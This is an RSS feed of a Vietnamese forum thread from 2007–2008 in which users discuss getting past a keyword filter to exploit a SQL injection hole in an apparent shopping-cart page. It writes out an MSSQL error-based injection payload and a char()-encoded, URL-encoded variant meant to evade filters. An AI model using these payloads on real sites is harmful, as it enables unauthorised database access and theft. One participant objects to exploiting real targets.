<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "Thâm nhập qua lỗi SQL Injection này được không?"]]></title>
		<link>/hvaonline/posts/list/12.html</link>
		<description><![CDATA[Latest messages posted in the topic "Thâm nhập qua lỗi SQL Injection này được không?"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Thâm nhập qua lỗi SQL Injection này được không?</title>
				<description><![CDATA[ Đây là link trang lỗi
http://www.site.com/addCart.asp?v=1&pid=2148779'
Sau khi thêm đủ kiểu and, or và union nó đều về trang chủ, chịu thua không biết tiếp tục thế nào. 
Vậy có thể thâm nhập trang trên thông qua lỗi injection này không?
Cám ơn mọi người đã đọc :)
]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/15752.html#94106</guid>
				<link>/hvaonline/posts/list/15752.html#94106</link>
				<pubDate><![CDATA[Tue, 30 Oct 2007 17:33:57]]> GMT</pubDate>
				<author><![CDATA[ chatting2005]]></author>
			</item>
			<item>
				<title>Re: Thâm nhập qua lỗi SQL Injection này được không?</title>
				<description><![CDATA[ nó filter keyword thôi]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/15752.html#94153</guid>
				<link>/hvaonline/posts/list/15752.html#94153</link>
				<pubDate><![CDATA[Tue, 30 Oct 2007 20:00:55]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: Thâm nhập qua lỗi SQL Injection này được không?</title>
				<description><![CDATA[ Mình thấy tấn công qua lỗi injection là nhờ vào các keyword, nó lọc các keyword thì tức là trang này mình không tấn công được phải không bạn  :( ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/15752.html#94258</guid>
				<link>/hvaonline/posts/list/15752.html#94258</link>
				<pubDate><![CDATA[Wed, 31 Oct 2007 09:09:58]]> GMT</pubDate>
				<author><![CDATA[ chatting2005]]></author>
			</item>
			<item>
				<title>Re: Thâm nhập qua lỗi SQL Injection này được không?</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">chatting2005 wrote:</cite><br>
		<blockquote>Mình thấy tấn công qua lỗi injection là nhờ vào các keyword, nó lọc các keyword thì tức là trang này mình không tấn công được phải không bạn  :( &nbsp;
		</blockquote>

Thử tìm hiểu xem "nó" lọc các keyword ở mức độ nào? (gợi ý: lọc keyword ở dạng ASCII bình thường hay lọc cả ở dạng encoded luôn?).

PS: Tôi tham gia chủ đề này với cái nhìn thuần túy kỹ thuật. Tôi không chấp nhận những exploit thật và dùng địa chỉ thật. Đặc biệt là các "shop" online. Bởi thế, tôi đề nghị sửa lại nội dung mang địa chỉ mang tính minh họa mà thôi.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/15752.html#94261</guid>
				<link>/hvaonline/posts/list/15752.html#94261</link>
				<pubDate><![CDATA[Wed, 31 Oct 2007 09:37:42]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: Thâm nhập qua lỗi SQL Injection này được không?</title>
				<description><![CDATA[ <blockquote>Thử tìm hiểu xem "nó" lọc các keyword ở mức độ nào? (gợi ý: lọc keyword ở dạng ASCII bình thường hay lọc cả ở dạng encoded luôn?). &nbsp;
		</blockquote>
Em chưa biết cách tìm hiểu  cách "nó" lọc keyword như thế nào , nhưng theo gợi ý của bác <b>conmale</b> thì có hai cách  :D  (chắc có nhiều nhưng bác chỉ chỉ hai cach thương áp dụng nhỉ) .
<ul><li> lọc keyword ở dạng ASCII </li></ul>
Nếu là lọc sang ASCII thì chắc ta phải convert sang ASCII phải không ạ ? Sau đó đưa lên ngay url để query sao ?
Ví dụ em có query :
<blockquote>and 1=convert(int,(select top 1 table_name from information_schema.tables))--&nbsp;
		</blockquote>
thì em phải chuyển sang ASCII là :
<blockquote>char(97)%2bchar(110)%2bchar(100)%2bchar(NULL)%2bchar(49)%2bchar(61)%2bchar(99)%2bchar(111)%2bchar(110)%2bchar(118)%2bchar(101)%2bchar(114)%2bchar(116)%2bchar(40)%2bchar(105)%2bchar(110)%2bchar(116)%2bchar(44)%2bchar(40)%2bchar(115)%2bchar(101)%2bchar(108)%2bchar(101)%2bchar(99)%2bchar(116)%2bchar(NULL)%2bchar(116)%2bchar(111)%2bchar(112)%2bchar(NULL)%2bchar(49)%2bchar(NULL)%2bchar(116)%2bchar(97)%2bchar(98)%2bchar(108)%2bchar(101)%2bchar(95)%2bchar(110)%2bchar(97)%2bchar(109)%2bchar(101)%2bchar(NULL)%2bchar(102)%2bchar(114)%2bchar(111)%2bchar(109)%2bchar(NULL)%2bchar(105)%2bchar(110)%2bchar(102)%2bchar(111)%2bchar(114)%2bchar(109)%2bchar(97)%2bchar(116)%2bchar(105)%2bchar(111)%2bchar(110)%2bchar(95)%2bchar(115)%2bchar(99)%2bchar(104)%2bchar(101)%2bchar(109)%2bchar(97)%2bchar(46)%2bchar(116)%2bchar(97)%2bchar(98)%2bchar(108)%2bchar(101)%2bchar(115)%2bchar(41)%2bchar(41)%2bchar(45)%2bchar(45)&nbsp;
		</blockquote>
Như vậy có đúng không ạ ?]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/15752.html#116653</guid>
				<link>/hvaonline/posts/list/15752.html#116653</link>
				<pubDate><![CDATA[Mon, 25 Feb 2008 20:53:36]]> GMT</pubDate>
				<author><![CDATA[ kimsonha]]></author>
			</item>
			<item>
				<title>Re: Thâm nhập qua lỗi SQL Injection này được không?</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">kimsonha wrote:</cite><br>
		<blockquote><blockquote>Thử tìm hiểu xem "nó" lọc các keyword ở mức độ nào? (gợi ý: lọc keyword ở dạng ASCII bình thường hay lọc cả ở dạng encoded luôn?). &nbsp;
		</blockquote>
Em chưa biết cách tìm hiểu  cách "nó" lọc keyword như thế nào , nhưng theo gợi ý của bác <b>conmale</b> thì có hai cách  :D  (chắc có nhiều nhưng bác chỉ chỉ hai cach thương áp dụng nhỉ) .
<ul><li> lọc keyword ở dạng ASCII </li></ul>
Nếu là lọc sang ASCII thì chắc ta phải convert sang ASCII phải không ạ ? Sau đó đưa lên ngay url để query sao ?
Ví dụ em có query :
<blockquote>and 1=convert(int,(select top 1 table_name from information_schema.tables))--&nbsp;
		</blockquote>
thì em phải chuyển sang ASCII là :
<blockquote>char(97)%2bchar(110)%2bchar(100)%2bchar(NULL)%2bchar(49)%2bchar(61)%2bchar(99)%2bchar(111)%2bchar(110)%2bchar(118)%2bchar(101)%2bchar(114)%2bchar(116)%2bchar(40)%2bchar(105)%2bchar(110)%2bchar(116)%2bchar(44)%2bchar(40)%2bchar(115)%2bchar(101)%2bchar(108)%2bchar(101)%2bchar(99)%2bchar(116)%2bchar(NULL)%2bchar(116)%2bchar(111)%2bchar(112)%2bchar(NULL)%2bchar(49)%2bchar(NULL)%2bchar(116)%2bchar(97)%2bchar(98)%2bchar(108)%2bchar(101)%2bchar(95)%2bchar(110)%2bchar(97)%2bchar(109)%2bchar(101)%2bchar(NULL)%2bchar(102)%2bchar(114)%2bchar(111)%2bchar(109)%2bchar(NULL)%2bchar(105)%2bchar(110)%2bchar(102)%2bchar(111)%2bchar(114)%2bchar(109)%2bchar(97)%2bchar(116)%2bchar(105)%2bchar(111)%2bchar(110)%2bchar(95)%2bchar(115)%2bchar(99)%2bchar(104)%2bchar(101)%2bchar(109)%2bchar(97)%2bchar(46)%2bchar(116)%2bchar(97)%2bchar(98)%2bchar(108)%2bchar(101)%2bchar(115)%2bchar(41)%2bchar(41)%2bchar(45)%2bchar(45)&nbsp;
		</blockquote>
Như vậy có đúng không ạ ?&nbsp;
		</blockquote>

Dòng trên là ASCII, dòng dưới là urlencoded (chớ không phải <i>"chuyển sang ASCII"</i>).

Tùy bộ lọc ấy có lọc thuần túy ASCII hay lọc cả urlencoded format mà đi đến chỗ query có được hay không.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/15752.html#116749</guid>
				<link>/hvaonline/posts/list/15752.html#116749</link>
				<pubDate><![CDATA[Tue, 26 Feb 2008 13:09:28]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: Thâm nhập qua lỗi SQL Injection này được không?</title>
				<description><![CDATA[ Em vẫn chưa hiểu được ý của bác <b>conmale</b>, 
<blockquote>Dòng trên là ASCII, dòng dưới là urlencoded (chớ không phải "<font color='red'>chuyển sang ASCII</font>").&nbsp;
		</blockquote>
Có một số trang khi query table đầu tiên thành công, nhưng khi query table tiếp theo thì mình cần <font color='red'>chuyển sang ASCII </font>thì mới query được . Như vậy thì phải gọi là chuyển sang ASCII đúng không ạ ?
Theo như em nghĩ thì khi xử lí query thì nếu phát hiện thấy có từ <b>and</b> , <b>or</b> hay <b>union</b>  thì sẽ loại bỏ truy vấn và đưa mình về trang chủ (cái này la đoán mò thôi, chứ em mới học lớp 11 à, kiến thức còn gà lắm) . Vậy nếu mình chuyển sang mã ASCII để query thì nó sẽ xử lí như sau:
<ul><li>kiếm tra xem trong query có các kí tự không cho phép hay không? Không =&gt; cho qua</li></ul>
<ul><li>sau đó nó gặp char() và nó chuyển các char() đó sang kí tự như ta vấn thấy</li></ul>
<ul><li>bây giờ nó xử lí truy vấn, và lúc này nó sẽ <b>không kiểm tra </b>các kí tự không cho phép nên ta sẽ lọt được qua khỏi bộ lọc đó </li></ul>
Không biết như vậy có đúng không ạ ?
Em vấn chưa hiểu cái này:
<blockquote>dòng dưới là urlencoded &nbsp;
		</blockquote>
Bác làm ơn nói rõ hơn được không ?]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/15752.html#117010</guid>
				<link>/hvaonline/posts/list/15752.html#117010</link>
				<pubDate><![CDATA[Wed, 27 Feb 2008 19:59:05]]> GMT</pubDate>
				<author><![CDATA[ kimsonha]]></author>
			</item>
			<item>
				<title>Re: Thâm nhập qua lỗi SQL Injection này được không?</title>
				<description><![CDATA[ Sao không tự tìm thử "urlencode" là cái gì?

Bồ thực thi cái query đó bằng phương tiện nào (xuyên qua SQL client, trình duyệt, netcat....)? ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/15752.html#117088</guid>
				<link>/hvaonline/posts/list/15752.html#117088</link>
				<pubDate><![CDATA[Thu, 28 Feb 2008 09:44:06]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: Thâm nhập qua lỗi SQL Injection này được không?</title>
				<description><![CDATA[ A em hiểu "urlencode" là gì rồi. em thực thi query qua trình duyệt nên gọi là urlencode đúng không ạ ?
Đây là lần đầu tiên em nghe thây hack SQL qua netcat, vậy ta có thể khai thác qua netcat như thế nào vậy bác ?]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/15752.html#117276</guid>
				<link>/hvaonline/posts/list/15752.html#117276</link>
				<pubDate><![CDATA[Fri, 29 Feb 2008 11:12:25]]> GMT</pubDate>
				<author><![CDATA[ kimsonha]]></author>
			</item>
			<item>
				<title>Re: Thâm nhập qua lỗi SQL Injection này được không?</title>
				<description><![CDATA[ <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>char&#40;97&#41;%2bchar&#40;110&#41;%2bchar&#40;100&#41;%2bchar&#40;NULL&#41;%2bchar&#40;49&#41;%2bchar&#40;61&#41;%2bchar&#40;99&#41;%2bchar&#40;111&#41;%2bchar&#40;110&#41;%2bchar&#40;118&#41;%2bchar&#40;101&#41;%2bchar&#40;114&#41;%2bchar&#40;116&#41;%2bchar&#40;40&#41;%2bchar&#40;105&#41;%2bchar&#40;110&#41;%2bchar&#40;116&#41;%2bchar&#40;44&#41;%2bchar&#40;40&#41;%2bchar&#40;115&#41;%2bchar&#40;101&#41;%2bchar&#40;108&#41;%2bchar&#40;101&#41;%2bchar&#40;99&#41;%2bchar&#40;116&#41;%2bchar&#40;NULL&#41;%2bchar&#40;116&#41;%2bchar&#40;111&#41;%2bchar&#40;112&#41;%2bchar&#40;NULL&#41;%2bchar&#40;49&#41;%2bchar&#40;NULL&#41;%2bchar&#40;116&#41;%2bchar&#40;97&#41;%2bchar&#40;98&#41;%2bchar&#40;108&#41;%2bchar&#40;101&#41;%2bchar&#40;95&#41;%2bchar&#40;110&#41;%2bchar&#40;97&#41;%2bchar&#40;109&#41;%2bchar&#40;101&#41;%2bchar&#40;NULL&#41;%2bchar&#40;102&#41;%2bchar&#40;114&#41;%2bchar&#40;111&#41;%2bchar&#40;109&#41;%2bchar&#40;NULL&#41;%2bchar&#40;105&#41;%2bchar&#40;110&#41;%2bchar&#40;102&#41;%2bchar&#40;111&#41;%2bchar&#40;114&#41;%2bchar&#40;109&#41;%2bchar&#40;97&#41;%2bchar&#40;116&#41;%2bchar&#40;105&#41;%2bchar&#40;111&#41;%2bchar&#40;110&#41;%2bchar&#40;95&#41;%2bchar&#40;115&#41;%2bchar&#40;99&#41;%2bchar&#40;104&#41;%2bchar&#40;101&#41;%2bchar&#40;109&#41;%2bchar&#40;97&#41;%2bchar&#40;46&#41;%2bchar&#40;116&#41;%2bchar&#40;97&#41;%2bchar&#40;98&#41;%2bchar&#40;108&#41;%2bchar&#40;101&#41;%2bchar&#40;115&#41;%2bchar&#40;41&#41;%2bchar&#40;41&#41;%2bchar&#40;45&#41;%2bchar&#40;45&#41;</pre>
		</div>
Dòng này là urlencode, nhưng nghe nói urlencode dùng bảng mã ASCII (gồm số và chữ), các kí tự <font color='red'>-_.!~*'()</font>, và "+" , "%", khoảng trắng đc chuyển thành "+" thì phải.
Vậy nếu bạn có 
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>char&#40;97&#41;%2bchar&#40;110&#41;%2bchar&#40;100&#41;%2bchar&#40;NULL&#41;%2bchar&#40;49&#41;%2bchar&#40;61&#41;%2bchar&#40;99&#41;%2bchar&#40;111&#41;%2bchar&#40;110&#41;%2bchar&#40;118&#41;%2bchar&#40;101&#41;%2bchar&#40;114&#41;%2bchar&#40;116&#41;%2bchar&#40;40&#41;%2bchar&#40;105&#41;%2bchar&#40;110&#41;%2bchar&#40;116&#41;%2bchar&#40;44&#41;%2bchar&#40;40&#41;%2bchar&#40;115&#41;%2bchar&#40;101&#41;%2bchar&#40;108&#41;%2bchar&#40;101&#41;%2bchar&#40;99&#41;%2bchar&#40;116&#41;%2bchar&#40;NULL&#41;%2bchar&#40;116&#41;%2bchar&#40;111&#41;%2bchar&#40;112&#41;%2bchar&#40;NULL&#41;%2bchar&#40;49&#41;%2bchar&#40;NULL&#41;%2bchar&#40;116&#41;%2bchar&#40;97&#41;%2bchar&#40;98&#41;%2bchar&#40;108&#41;%2bchar&#40;101&#41;%2bchar&#40;95&#41;%2bchar&#40;110&#41;%2bchar&#40;97&#41;%2bchar&#40;109&#41;%2bchar&#40;101&#41;%2bchar&#40;NULL&#41;%2bchar&#40;102&#41;%2bchar&#40;114&#41;%2bchar&#40;111&#41;%2bchar&#40;109&#41;%2bchar&#40;NULL&#41;%2bchar&#40;105&#41;%2bchar&#40;110&#41;%2bchar&#40;102&#41;%2bchar&#40;111&#41;%2bchar&#40;114&#41;%2bchar&#40;109&#41;%2bchar&#40;97&#41;%2bchar&#40;116&#41;%2bchar&#40;105&#41;%2bchar&#40;111&#41;%2bchar&#40;110&#41;%2bchar&#40;95&#41;%2bchar&#40;115&#41;%2bchar&#40;99&#41;%2bchar&#40;104&#41;%2bchar&#40;101&#41;%2bchar&#40;109&#41;%2bchar&#40;97&#41;%2bchar&#40;46&#41;%2bchar&#40;116&#41;%2bchar&#40;97&#41;%2bchar&#40;98&#41;%2bchar&#40;108&#41;%2bchar&#40;101&#41;%2bchar&#40;115&#41;%2bchar&#40;41&#41;%2bchar&#40;41&#41;%2bchar&#40;45&#41;%2bchar&#40;45&#41;</pre>
		</div>
 thì decode sẽ ra
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>char&#40;97&#41;+char&#40;110&#41;+char&#40;100&#41;+char&#40;NULL&#41;+char&#40;49&#41;+char&#40;61&#41;+char&#40;99&#41;+char&#40;111&#41;+char&#40;110&#41;+char&#40;118&#41;+char&#40;101&#41;+char&#40;114&#41;+char&#40;116&#41;+char&#40;40&#41;+char&#40;105&#41;+char&#40;110&#41;+char&#40;116&#41;+char&#40;44&#41;+char&#40;40&#41;+char&#40;115&#41;+char&#40;101&#41;+char&#40;108&#41;+char&#40;101&#41;+char&#40;99&#41;+char&#40;116&#41;+char&#40;NULL&#41;+char&#40;116&#41;+char&#40;111&#41;+char&#40;112&#41;+char&#40;NULL&#41;+char&#40;49&#41;+char&#40;NULL&#41;+char&#40;116&#41;+char&#40;97&#41;+char&#40;98&#41;+char&#40;108&#41;+char&#40;101&#41;+char&#40;95&#41;+char&#40;110&#41;+char&#40;97&#41;+char&#40;109&#41;+char&#40;101&#41;+char&#40;NULL&#41;+char&#40;102&#41;+char&#40;114&#41;+char&#40;111&#41;+char&#40;109&#41;+char&#40;NULL&#41;+char&#40;105&#41;+char&#40;110&#41;+char&#40;102&#41;+char&#40;111&#41;+char&#40;114&#41;+char&#40;109&#41;+char&#40;97&#41;+char&#40;116&#41;+char&#40;105&#41;+char&#40;111&#41;+char&#40;110&#41;+char&#40;95&#41;+char&#40;115&#41;+char&#40;99&#41;+char&#40;104&#41;+char&#40;101&#41;+char&#40;109&#41;+char&#40;97&#41;+char&#40;46&#41;+char&#40;116&#41;+char&#40;97&#41;+char&#40;98&#41;+char&#40;108&#41;+char&#40;101&#41;+char&#40;115&#41;+char&#40;41&#41;+char&#40;41&#41;+char&#40;45&#41;+char&#40;45&#41;</pre>
		</div>

vẫn còn dấu cộng:) nên decode lần nữa, "+" thành khoảng trắng
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>char&#40;97&#41; char&#40;110&#41; char&#40;100&#41; char&#40;NULL&#41; char&#40;49&#41; char&#40;61&#41; char&#40;99&#41; char&#40;111&#41; char&#40;110&#41; char&#40;118&#41; char&#40;101&#41; char&#40;114&#41; char&#40;116&#41; char&#40;40&#41; char&#40;105&#41; char&#40;110&#41; char&#40;116&#41; char&#40;44&#41; char&#40;40&#41; char&#40;115&#41; char&#40;101&#41; char&#40;108&#41; char&#40;101&#41; char&#40;99&#41; char&#40;116&#41; char&#40;NULL&#41; char&#40;116&#41; char&#40;111&#41; char&#40;112&#41; char&#40;NULL&#41; char&#40;49&#41; char&#40;NULL&#41; char&#40;116&#41; char&#40;97&#41; char&#40;98&#41; char&#40;108&#41; char&#40;101&#41; char&#40;95&#41; char&#40;110&#41; char&#40;97&#41; char&#40;109&#41; char&#40;101&#41; char&#40;NULL&#41; char&#40;102&#41; char&#40;114&#41; char&#40;111&#41; char&#40;109&#41; char&#40;NULL&#41; char&#40;105&#41; char&#40;110&#41; char&#40;102&#41; char&#40;111&#41; char&#40;114&#41; char&#40;109&#41; char&#40;97&#41; char&#40;116&#41; char&#40;105&#41; char&#40;111&#41; char&#40;110&#41; char&#40;95&#41; char&#40;115&#41; char&#40;99&#41; char&#40;104&#41; char&#40;101&#41; char&#40;109&#41; char&#40;97&#41; char&#40;46&#41; char&#40;116&#41; char&#40;97&#41; char&#40;98&#41; char&#40;108&#41; char&#40;101&#41; char&#40;115&#41; char&#40;41&#41; char&#40;41&#41; char&#40;45&#41; char&#40;45&#41;</pre>
		</div>


Mò, nên %đúng là rất ít :) ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/15752.html#117314</guid>
				<link>/hvaonline/posts/list/15752.html#117314</link>
				<pubDate><![CDATA[Fri, 29 Feb 2008 14:23:37]]> GMT</pubDate>
				<author><![CDATA[ mR.Bi]]></author>
			</item>
	</channel>
</rss>
